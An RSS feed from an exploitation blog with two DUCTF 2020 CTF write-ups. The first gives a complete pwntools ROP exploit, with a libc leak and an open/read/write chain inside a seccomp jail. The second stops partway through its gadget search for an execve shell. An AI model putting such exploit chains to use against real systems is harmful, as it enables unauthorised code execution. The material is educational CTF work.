<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ctf on Anvbis</title><link>https://anvbis.github.io/tags/ctf/</link><description>Recent content in ctf on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Copyright 2020 Anvbis</copyright><lastBuildDate>Tue, 17 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>DUCTF 2020 :: Return to What's Revenge</title><link>https://anvbis.github.io/posts/ductf-2020-return-to-whats-revenge/</link><pubDate>Tue, 17 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/ductf-2020-return-to-whats-revenge/</guid><description>Reverse Engineering Running file tells us that the target binary is a 64-bit dynamically linked linux executable.
$ file ./return-to-whats-revenge ./return-to-whats-revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=85709e2a953fc6f7da43f29d1dee0c5cc682a059, with debug_info, not stripped We can run pwntools' checksec tool to get a better overview of the protections the target binary has in place. Note that the only protection in place is DEP, so we&amp;rsquo;ll likely have to build a ROP chain to bypass it.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>Running &lt;code>file&lt;/code> tells us that the target binary is a 64-bit dynamically linked linux executable.&lt;/p>
&lt;pre>&lt;code>$ file ./return-to-whats-revenge
./return-to-whats-revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=85709e2a953fc6f7da43f29d1dee0c5cc682a059, with debug_info, not stripped
&lt;/code>&lt;/pre>&lt;p>We can run pwntools' &lt;code>checksec&lt;/code> tool to get a better overview of the protections the target binary has in place. Note that the only protection in place is DEP, so we&amp;rsquo;ll likely have to build a ROP chain to bypass it.&lt;/p>
&lt;pre>&lt;code>$ checksec ./return-to-whats-revenge
[*] './return-to-whats-revenge'
Arch: amd64-64-little
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;p>Running the binary shows us that it simply prompts the user for input prior to exiting. It&amp;rsquo;s likely we&amp;rsquo;ll find a vulnerability of some sort where it takes user input.&lt;/p>
&lt;pre>&lt;code>$ ./return-to-whats-revenge
Today, we'll have a lesson in returns.
Where would you like to return to?
asdf
&lt;/code>&lt;/pre>&lt;p>Disassembling the executable shows us that it contains two important functions. The &lt;code>main&lt;/code> function calls a function called &lt;code>vuln&lt;/code>. The &lt;code>vuln&lt;/code> function makes a &lt;code>gets&lt;/code> call with a stack variable, so we&amp;rsquo;ve found a stack buffer overflow.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">vuln&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>s;
puts(&lt;span style="color:#e6db74">&amp;#34;Where would you like to return to?&amp;#34;&lt;/span>);
gets(&lt;span style="color:#f92672">&amp;amp;&lt;/span>s);
&lt;span style="color:#66d9ef">return&lt;/span>;
}
undefined8 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
puts(&lt;span style="color:#e6db74">&amp;#34;Today, we&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">ll have a lesson in returns.&amp;#34;&lt;/span>);
vuln();
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Running &lt;code>strace&lt;/code> on the binary shows us that (at some point prior to taking user input) instantiates several &lt;code>seccomp&lt;/code> rules, so not only will we have to build a ROP chain, we&amp;rsquo;ll have to work within the &lt;code>seccomp&lt;/code> jail.&lt;/p>
&lt;pre>&lt;code>$ strace ./return-to-whats-revenge
...
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=25, filter=0x7fff935ea670}) = 0
...
&lt;/code>&lt;/pre>&lt;p>We can use a wonderful tool called &lt;code>seccomp-tools&lt;/code> to dump the &lt;code>seccomp&lt;/code> rules that the binary operates under. Note that the binary allows the &lt;code>open&lt;/code>, &lt;code>read&lt;/code>, and &lt;code>write&lt;/code> syscalls - so we should be able to build a ROP chain that opens, reads, and writes the flag to &lt;code>stdout&lt;/code>.&lt;/p>
&lt;pre>&lt;code>$ seccomp-tools dump ./return-to-whats-revenge
line CODE JT JF K
=================================
0000: 0x20 0x00 0x00 0x00000004 A = arch
0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003
0002: 0x06 0x00 0x00 0x00000000 return KILL
0003: 0x20 0x00 0x00 0x00000000 A = sys_number
0004: 0x15 0x00 0x01 0x0000000f if (A != rt_sigreturn) goto 0006
0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0006: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0008
0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010
0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0010: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0012
0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0012: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0014
0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0014: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0016
0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0016: 0x15 0x00 0x01 0x0000000c if (A != brk) goto 0018
0017: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0018: 0x15 0x00 0x01 0x00000009 if (A != mmap) goto 0020
0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0020: 0x15 0x00 0x01 0x0000000a if (A != mprotect) goto 0022
0021: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0022: 0x15 0x00 0x01 0x00000003 if (A != close) goto 0024
0023: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0024: 0x06 0x00 0x00 0x00000000 return KILL
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s use &lt;code>readelf&lt;/code> to get the address of the binary&amp;rsquo;s &lt;code>.data&lt;/code> section, we&amp;rsquo;ll want to use it to store our &lt;code>flag.txt&lt;/code> string that we use in the &lt;code>open&lt;/code> syscall of our ROP chain.&lt;/p>
&lt;pre>&lt;code>$ readelf --sections ./return-to-whats-revenge
..
[22] .data PROGBITS 0000000000404000 00003000
0000000000000010 0000000000000000 WA
...
&lt;/code>&lt;/pre>&lt;p>Earlier we noticed that the binary uses &lt;code>puts&lt;/code>, we can use this to perform a simple &lt;code>puts(puts)&lt;/code> style leak to obtain the an address in &lt;code>libc&lt;/code>. Let&amp;rsquo;s find the offset of &lt;code>puts&lt;/code> from the base of &lt;code>libc&lt;/code>. We&amp;rsquo;ll want to use this later to find the base address of &lt;code>libc&lt;/code>.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; info proc map
process 1461
Mapped address spaces:
Start Addr End Addr Size Offset objfile
...
0x7ffff7def000 0x7ffff7e14000 0x25000 0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
pwndbg&amp;gt; p puts
$2 = {int (const char *)} 0x7ffff7e655f0 &amp;lt;__GI__IO_puts&amp;gt;
pwndbg&amp;gt; p/x 0x7ffff7e655f0-0x7ffff7def000
$3 = 0x765f0
&lt;/code>&lt;/pre>&lt;p>Lastly, we just need to find a bunch of different ROP gadgets in order to perform our exploit. These are mostly just &lt;code>pop reg; ret&lt;/code> instructions that we can use to move values into the registers we need to perform syscalls, and a &lt;code>syscall&lt;/code> instruction that&amp;rsquo;ll allow us to execute our &lt;code>open&lt;/code>, &lt;code>read&lt;/code>, and &lt;code>write&lt;/code> syscalls.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./return-to-whats-revenge --search 'pop rdi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi
[INFO] File: ./return-to-whats-revenge
0x00000000004019db: pop rdi; ret;
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ ropper --file ./return-to-whats-revenge --search 'pop rsi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rsi
[INFO] File: ./return-to-whats-revenge
0x00000000004019d9: pop rsi; pop r15; ret;
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'pop rdx'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdx
[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x00000000000cb1cd: pop rdx; ret;
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'pop rax'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rax
[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x000000000003ee88: pop rax; ret;
...
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$ ropper --file /lib/x86_64-linux-gnu/libc-2.31.so --search 'syscall'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: syscall
[INFO] File: /lib/x86_64-linux-gnu/libc-2.31.so
...
0x00000000000580da: syscall; ret;
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>The only bit of information we now need to gather is the offset of the return address from our input buffer.&lt;/p>
&lt;p>Here&amp;rsquo;s a quick script that&amp;rsquo;ll attach the process to GDB before sending a large cyclic pattern of bytes to it, allowing us to find the offset of the return address from our input buffer.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./return-to-whats-revenge&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">300&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After continuing in GDB and letting the program crash, we can see what was stored in the return address.&lt;/p>
&lt;pre>&lt;code> ► 0x4011d9 &amp;lt;vuln+39&amp;gt; ret &amp;lt;0x6161616161616168&amp;gt;
&lt;/code>&lt;/pre>&lt;p>We can use pwntools' &lt;code>cyclic_find&lt;/code> function to calculate the offset of the return address from the start of our input buffer (using the value stored in the return address we found above).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616161616168&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">56&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>Now that we have everything we need, we can start to write our exploit. There&amp;rsquo;s a lot of things we&amp;rsquo;ll need to achieve (leaks, etc), so here&amp;rsquo;s a brief summary of what we want to do:&lt;/p>
&lt;ul>
&lt;li>Overwrite the return address to gain control of process execution.&lt;/li>
&lt;li>Perform a &lt;code>puts(puts)&lt;/code> leak to obtain an address in &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>Calculate the base address of &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>Return back to &lt;code>main&lt;/code> so we can perform the second stage of our exploit.&lt;/li>
&lt;li>Build a ROP chain that opens, reads, and writes the contents of &lt;code>flag.txt&lt;/code>.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> time
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>clear(arch&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>)
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">return-to-whats-revenge
&lt;/span>&lt;span style="color:#e6db74">0x00000000004019db: pop rdi; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4019db&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">return-to-whats-revenge
&lt;/span>&lt;span style="color:#e6db74">0x00000000004019d9: pop rsi; pop r15; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rsi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4019d9&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">libc-3.1.so
&lt;/span>&lt;span style="color:#e6db74">0x00000000000cb1cd: pop rdx; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rdx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0cb1cd&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">libc-3.1.so
&lt;/span>&lt;span style="color:#e6db74">0x000000000003ee88: pop rax; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rax &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x03ee88&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">libc-3.1.so
&lt;/span>&lt;span style="color:#e6db74">0x00000000000580da: syscall; ret;
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
syscall &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0580da&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./return-to-whats-revenge&amp;#39;&lt;/span>)
elf &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-whats-revenge&amp;#39;&lt;/span>)
rop &lt;span style="color:#f92672">=&lt;/span> ROP(elf)
rop&lt;span style="color:#f92672">.&lt;/span>raw(pop_rdi)
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>got[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#75715e"># pop rdi ; got.puts&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>plt[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>])
rop&lt;span style="color:#f92672">.&lt;/span>raw(elf&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;main&amp;#39;&lt;/span>])
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain())
leak &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>readline()[:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]
leak &lt;span style="color:#f92672">=&lt;/span> unpack(leak, len(leak) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>)
libc &lt;span style="color:#f92672">=&lt;/span> leak &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x765f0&lt;/span>
rop &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;span style="color:#75715e"># read(.data, stdin, 9)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">0&lt;/span>, pop_rsi, &lt;span style="color:#ae81ff">0x404000&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rdx, &lt;span style="color:#ae81ff">9&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall,
&lt;span style="color:#75715e"># open(&amp;#34;flag.txt&amp;#34;, 0, 0)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">0x404000&lt;/span>, pop_rsi, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rdx, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">2&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall,
&lt;span style="color:#75715e"># read(3, .data+0x10, 35)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">3&lt;/span>, pop_rsi, &lt;span style="color:#ae81ff">0x404010&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rdx, &lt;span style="color:#ae81ff">35&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall,
&lt;span style="color:#75715e"># write(stdout, .data+0x10, 35)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">1&lt;/span>, pop_rsi, &lt;span style="color:#ae81ff">0x404010&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rdx, &lt;span style="color:#ae81ff">35&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">1&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall,
&lt;span style="color:#75715e"># exit(0)&lt;/span>
pop_rdi, &lt;span style="color:#ae81ff">0&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>pop_rax, &lt;span style="color:#ae81ff">60&lt;/span>, libc&lt;span style="color:#f92672">+&lt;/span>syscall
)
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> rop)
r&lt;span style="color:#f92672">.&lt;/span>writeline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;flag.txt&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>readuntil(&lt;span style="color:#e6db74">&amp;#39;Where would you like to return to?&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
print(r&lt;span style="color:#f92672">.&lt;/span>readall())
r&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action. It spawns an interactive shell that we can use to retrieve the flag.&lt;/p>
&lt;pre>&lt;code>$ ./exploit.py
[+] Starting local process './return-to-whats-revenge': pid 2683
[*] './return-to-whats-revenge'
Arch: amd64-64-little
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
[*] Loaded 14 cached gadgets for './return-to-whats-revenge'
Today, we'll have a lesson in returns.
Where would you like to return to?
DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}
[*] Stopped process './return-to-whats-revenge' (pid 2683)
&lt;/code>&lt;/pre></content></item><item><title>DUCTF 2020 :: Return to What</title><link>https://anvbis.github.io/posts/ductf-2020-return-to-what/</link><pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/ductf-2020-return-to-what/</guid><description>Reverse Engineering We&amp;rsquo;ll start by running file to get an idea of the executable&amp;rsquo;s architecture and platform. Note that it is a 64-bit linux executable.
$ file return-to-what return-to-what: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=02d43d7f8ca04895439f73b904f5204ba9984802, not stripped Running pwntools' checksec tool reveals that the only exploit protection in place is an enabled NX bit. So while we can&amp;rsquo;t execute shellcode on the stack, we&amp;rsquo;ll at least be able to access any part of the executable.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>We&amp;rsquo;ll start by running &lt;code>file&lt;/code> to get an idea of the executable&amp;rsquo;s architecture and platform. Note that it is a 64-bit linux executable.&lt;/p>
&lt;pre>&lt;code>$ file return-to-what
return-to-what: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=02d43d7f8ca04895439f73b904f5204ba9984802, not stripped
&lt;/code>&lt;/pre>&lt;p>Running pwntools' &lt;code>checksec&lt;/code> tool reveals that the only exploit protection in place is an enabled NX bit. So while we can&amp;rsquo;t execute shellcode on the stack, we&amp;rsquo;ll at least be able to access any part of the executable.&lt;/p>
&lt;pre>&lt;code>$ checksec return-to-what 130 ⨯
[*] './return-to-what'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;p>Running the executable reveals that it&amp;rsquo;s only functionality is to accept user input, prior to exiting. It&amp;rsquo;s likely that we&amp;rsquo;ll find a vulnerability of some sort here.&lt;/p>
&lt;pre>&lt;code>$ ./return-to-what
Today, we'll have a lesson in returns.
Where would you like to return to?
asdf
&lt;/code>&lt;/pre>&lt;p>Disassembly the executable shows us that it contains two important functions. The &lt;code>main&lt;/code> function, which calls a function called &lt;code>vuln&lt;/code>. The &lt;code>vuln&lt;/code> function makes a &lt;code>gets&lt;/code> call, we&amp;rsquo;ve found a buffer overflow.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">vuln&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>s;
puts(&lt;span style="color:#e6db74">&amp;#34;Where would you like to return to?&amp;#34;&lt;/span>);
gets(&lt;span style="color:#f92672">&amp;amp;&lt;/span>s);
&lt;span style="color:#66d9ef">return&lt;/span>;
}
undefined8 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
puts(&lt;span style="color:#e6db74">&amp;#34;Today, we&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">ll have a lesson in returns.&amp;#34;&lt;/span>);
vuln();
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Since the executable doesn&amp;rsquo;t leak any import information to us (such as a &lt;code>libc&lt;/code> address), we&amp;rsquo;ll have to find a way to leak something ourselves.&lt;/p>
&lt;p>Looking at the imported functions, we can see an entry for &lt;code>puts&lt;/code>. With this we should be able to do a classic &lt;code>libc&lt;/code> leak with &lt;code>puts(puts)&lt;/code>, more on that later.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; info functions
All defined functions:
Non-debugging symbols:
0x0000000000401000 _init
0x0000000000401030 puts@plt
0x0000000000401040 gets@plt
0x0000000000401050 setvbuf@plt
0x0000000000401060 _start
0x0000000000401090 _dl_relocate_static_pie
0x00000000004010a0 deregister_tm_clones
0x00000000004010d0 register_tm_clones
0x0000000000401110 __do_global_dtors_aux
0x0000000000401140 frame_dummy
0x0000000000401142 setup
0x0000000000401185 vuln
0x00000000004011ad main
0x00000000004011d0 __libc_csu_init
0x0000000000401230 __libc_csu_fini
0x0000000000401234 _fini
&lt;/code>&lt;/pre>&lt;p>Before going any further, let&amp;rsquo;s find the offset of the &lt;code>puts&lt;/code> function within &lt;code>libc&lt;/code>. Below is a few GDB commands that achieves this goal.&lt;/p>
&lt;p>Here&amp;rsquo;s what we&amp;rsquo;re doing:&lt;/p>
&lt;ul>
&lt;li>Printing the process map to get the start address of &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>Getting the address of &lt;code>puts&lt;/code>.&lt;/li>
&lt;li>Subtracting the start address of &lt;code>libc&lt;/code> from &lt;code>puts&lt;/code> to get the offset.&lt;/li>
&lt;/ul>
&lt;pre>&lt;code>pwndbg&amp;gt; info proc map
process 1968
Mapped address spaces:
Start Addr End Addr Size Offset objfile
...
0x7ffff7def000 0x7ffff7e14000 0x25000 0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
pwndbg&amp;gt; p puts
$4 = {int (const char *)} 0x7ffff7e655f0 &amp;lt;__GI__IO_puts&amp;gt;
pwndbg&amp;gt; p/x 0x7ffff7e655f0-0x7ffff7def000
$5 = 0x765f0
&lt;/code>&lt;/pre>&lt;p>There are a few more things we need to find before we can write our shellcode, mainly:&lt;/p>
&lt;ul>
&lt;li>A &lt;code>pop rdi&lt;/code> instruction, so we can leak &lt;code>libc&lt;/code>.&lt;/li>
&lt;li>The &amp;lsquo;magic&amp;rsquo; gadget, so we can get a shell.&lt;/li>
&lt;/ul>
&lt;p>We can use the &lt;code>ropper&lt;/code> tool to find a &lt;code>pop rdi&lt;/code> instruction, easily found within the executable.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./return-to-what --search 'pop rdi'
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi
[INFO] File: ./return-to-what
0x000000000040122b: pop rdi; ret;
&lt;/code>&lt;/pre>&lt;p>Using the &lt;code>one_gadget&lt;/code> tool, we can find a &amp;lsquo;magic&amp;rsquo; gadget that&amp;rsquo;ll immediately give us a shell, provided we meet the conditions. We just need a rop gadget that will help us set this up.&lt;/p>
&lt;pre>&lt;code>$ one_gadget /usr/lib/x86_64-linux-gnu/libc-2.31.so
0xcbd1a execve(&amp;quot;/bin/sh&amp;quot;, r12, r13)
constraints:
[r12] == NULL || r12 == NULL
[r13] == NULL || r13 == NULL
0xcbd1d execve(&amp;quot;/bin/sh&amp;quot;, r12, rdx)
constraints:
[r12] == NULL || r12 == NULL
[rdx] == NULL || rdx == NULL
0xcbd20 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
constraints:
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL
&lt;/code>&lt;/pre>&lt;p>The &amp;lsquo;magic&amp;rsquo; gadget I like the most is the first one, so let&amp;rsquo;s find a gadget that&amp;rsquo;ll set this up. We&amp;rsquo;ll use &lt;code>ropper&lt;/code> again.&lt;/p>
&lt;pre>&lt;code>$ ropper --file ./return-to-what --search 'pop r12'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r12
[INFO] File: ./return-to-what
0x0000000000401224: pop r12; pop r13; pop r14; pop r15; ret;
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
